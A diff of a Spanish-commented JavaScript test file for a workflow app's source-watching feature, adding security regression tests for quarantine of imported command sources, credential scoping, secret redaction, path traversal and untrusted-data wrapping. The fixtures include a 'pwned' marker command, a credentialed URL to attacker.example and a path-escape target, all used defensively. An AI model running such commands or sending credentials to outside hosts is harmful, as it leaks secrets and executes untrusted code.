@@ -77,8 +77,10 @@ test('archivos y comando: agregados, cambiados y quitados elemento por elemento;
 
 test('Jira con Haiku de solo lectura: la app (no el modelo) dice el cambio de estado y los comentarios nuevos', async () => {
   const items = (status, comments) => JSON.stringify({ items: [{ id: 'SBK-1', version: `2026-11-18T10:00|${status}|${comments}`, title: 'Line History' }] });
-  const st = role('Analizar', 'x', { id: 's_wj', watches: [{ id: 'w_j', type: 'jira', target: 'SBK-1 {{vars.mock}}' }] });
-  const f = await s.flow('Vigila Jira', [st], [], { vars: { mock: `[[mock:say ${items('In Progress', 3)}]]` } });
+  const ans = path.join(s.dirs.work, `jira-${Date.now()}.json`).replace(/\\/g, '/');
+  fs.writeFileSync(ans, items('In Progress', 3));
+  const st = role('Analizar', 'x', { id: 's_wj', watches: [{ id: 'w_j', type: 'jira', target: `SBK-1 [[mock:say-file ${ans}]]` }] });
+  const f = await s.flow('Vigila Jira', [st], []);
   const n0 = s.calls().length;
   assert.equal((await check(f.id)).results[0].state, 'first');
   const call = s.callsSince(n0)[0];
@@ -87,7 +89,7 @@ test('Jira con Haiku de solo lectura: la app (no el modelo) dice el cambio de es
   assert.doesNotMatch(s.argOf(call, '--allowedTools'), /editJiraIssue|addComment|transition|createJira/i);
   assert.match(s.argOf(call, '--disallowedTools'), /Edit,Write.*Bash/);
   assert.equal(s.argOf(call, '--model'), 'haiku');
-  const g = await s.getFlow(f.id); g.vars.mock = `[[mock:say ${items('Ready For Testing', 5)}]]`; await s.uiOk('PUT', `/api/flows/${f.id}`, g);
+  fs.writeFileSync(ans, items('Ready For Testing', 5));
   const r = await check(f.id);
   assert.equal(r.results[0].state, 'new');
   assert.equal(r.results[0].changes[0].text, 'SBK-1 (Line History): estado In Progress → Ready For Testing; 2 comentario(s) nuevo(s)');
@@ -175,4 +177,83 @@ test('UI: agregar una fuente, comprobar, ver la novedad en el nodo (🔔 1) y ma
     await nodeLoc.getByTestId('news-badge').waitFor({ state: 'detached' });
     assert.equal((await u.getFlow(f.id)).steps[0].watches[0].type, 'file');
   } finally { await ui.close?.(); }
+});
+
+// ---- regressions of the architect + adversarial reviews (2026-11-18) ----
+test('revisión: importar una fuente "comando" o una URL con credencial pone el flujo en cuarentena, y en cuarentena no se comprueba nada', async () => {
+  const marker = path.join(s.dirs.work, `pwned-${Date.now()}.txt`);
+  const st = role('Paso', 'x', { id: 's_q', watches: [{ id: 'w_c', type: 'command', target: `Set-Content -Path '${marker}' -Value x` }, { id: 'w_u', type: 'url', target: 'https://attacker.example/x', options: { credential: 'jira' } }, { id: 'w_c', type: 'file', target: 'a.txt' }] });
+  const f = await s.flow('Para exportar', [st], []);
+  const bundle = await s.uiOk('GET', `/api/flows/${f.id}/export`);
+  const { flow: g } = await s.uiOk('POST', '/api/flows/import', { bundle });
+  assert.ok(g.quarantine, 'en cuarentena');
+  assert.ok(g.quarantine.reasons.some((r) => /fuente vigilada con comando/.test(r)), JSON.stringify(g.quarantine.reasons));
+  assert.ok(g.quarantine.reasons.some((r) => /usa la credencial «jira»/.test(r)));
+  assert.equal(new Set(g.steps[0].watches.map((w) => w.id)).size, 3, 'ids únicos al importar (saneado)');
+  const r = await s.ui('POST', `/api/flows/${g.id}/watch/check`, {});
+  assert.equal(r.status, 423);
+  assert.equal((await s.ext('POST', `/flows/${g.id}/status`, {})).status, 423);
+  assert.ok(!fs.existsSync(marker), 'el comando no corrió');
+});
+
+test('revisión: una credencial solo viaja a su propio sitio; el secreto de un comando no se guarda ni se muestra', async () => {
+  let got = null;
+  const srv = http.createServer((req, res) => { got = req.headers.authorization || null; res.writeHead(200, { ETag: '"a"' }); res.end(); });
+  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
+  const base = `http://127.0.0.1:${srv.address().port}`;
+  try {
+    await s.uiOk('POST', '/api/credentials', { type: 'jenkins', name: 'ci', fields: { url: base, user: 'qa', token: 'TOKEN-JENKINS-1' } });
+    await s.uiOk('POST', '/api/credentials', { type: 'generic', name: 'k', fields: { value: 'TOPSECRET42' } });
+    const dir = path.join(s.dirs.work, `wsec-${Date.now()}`); fs.mkdirSync(dir, { recursive: true });
+    const st = cmd('Paso', 'Write-Output x', { id: 's_sec', watches: [
+      { id: 'w_ok', type: 'url', target: `${base}/job/x`, options: { credential: 'ci' } },
+      { id: 'w_other', type: 'url', target: 'http://127.0.0.2:9/x', options: { credential: 'ci' } },
+      { id: 'w_cmd', type: 'command', target: 'Write-Output "token={{cred.k.value}}"' },
+      { id: 'w_out', type: 'file', target: '../../secreto.txt' },
+    ] });
+    const f = await s.flow('Credenciales', [st], [], { cwd: dir });
+    const r = await check(f.id);
+    const by = (id) => r.results.find((x) => x.watchId === id);
+    assert.equal(by('w_ok').state, 'first', by('w_ok').error);
+    assert.match(got, /^Basic /, 'a su propio sitio sí');
+    assert.equal(by('w_other').state, 'error');
+    assert.match(by('w_other').error, /no se envía a http:\/\/127\.0\.0\.2:9/);
+    assert.equal(by('w_out').state, 'error');
+    assert.match(by('w_out').error, /dentro de la carpeta del flujo/);
+    const stored = fs.readFileSync(path.join(s.dirs.data, 'watch', `${f.id}.json`), 'utf8');
+    assert.ok(!stored.includes('TOPSECRET42'), 'el secreto no queda en el estado');
+    assert.match(stored, /token=/);
+  } finally { srv.close(); }
+});
+
+test('revisión: una ejecución lanzada por novedades tiene los controles de una externa (plantilla cruda rechazada) y la novedad llega como datos externos', async () => {
+  const dir = path.join(s.dirs.work, `wguard-${Date.now()}`); fs.mkdirSync(dir, { recursive: true });
+  fs.writeFileSync(path.join(dir, 'b.txt'), '1');
+  const raw = cmd('Crudo', 'Write-Output {{{input}}}', { id: 's_raw', watches: [{ id: 'w_g', type: 'file', target: 'b.txt', onChange: 'run_step' }] });
+  const f = await s.flow('Guardas', [raw], [], { cwd: dir });
+  await check(f.id);
+  fs.writeFileSync(path.join(dir, 'b.txt'), '2');
+  const r = await check(f.id);
+  assert.equal(r.actions[0].runId, undefined);
+  assert.match(r.actions[0].error, /No se ejecutó: .*\{\{\{input\}\}\}/);
+  // a safe step: the run gets the news wrapped as untrusted data
+  const g = await s.getFlow(f.id); g.steps[0].command = 'Write-Output {{input}}'; await s.uiOk('PUT', `/api/flows/${f.id}`, g);
+  fs.writeFileSync(path.join(dir, 'b.txt'), '3');
+  const r2 = await check(f.id);
+  assert.ok(r2.actions[0].runId, JSON.stringify(r2.actions));
+  const run = await s.waitRun(f.id, r2.actions[0].runId);
+  assert.match(run.input, /<untrusted-data>[\s\S]*b\.txt: cambió[\s\S]*<\/untrusted-data>/);
+});
+
+test('revisión: steps duplicados no comparten el estado de sus fuentes; cambiar {{vars.x}} es una referencia nueva', async () => {
+  const dir = path.join(s.dirs.work, `wdup-${Date.now()}`); fs.mkdirSync(dir, { recursive: true });
+  fs.writeFileSync(path.join(dir, 'a.txt'), 'a'); fs.writeFileSync(path.join(dir, 'b.txt'), 'b');
+  const w = { id: 'w_same', type: 'file', target: '{{vars.f}}' };
+  const f = await s.flow('Duplicados', [role('A', 'x', { id: 's_da', watches: [w] }), role('B', 'x', { id: 's_db', watches: [{ ...w }] })], [], { cwd: dir, vars: { f: 'a.txt' } });
+  const g = await s.getFlow(f.id);
+  assert.notEqual(g.steps[0].watches[0].id, g.steps[1].watches[0].id, 'el id repetido se renueva al guardar');
+  await check(f.id);
+  assert.ok((await check(f.id)).results.every((x) => x.state === 'same'), 'sin diffs falsos entre los dos');
+  g.vars.f = 'b.txt'; await s.uiOk('PUT', `/api/flows/${f.id}`, g);
+  assert.ok((await check(f.id)).results.every((x) => x.state === 'first'), 'otro archivo: nueva referencia, no un "cambio"');
 });
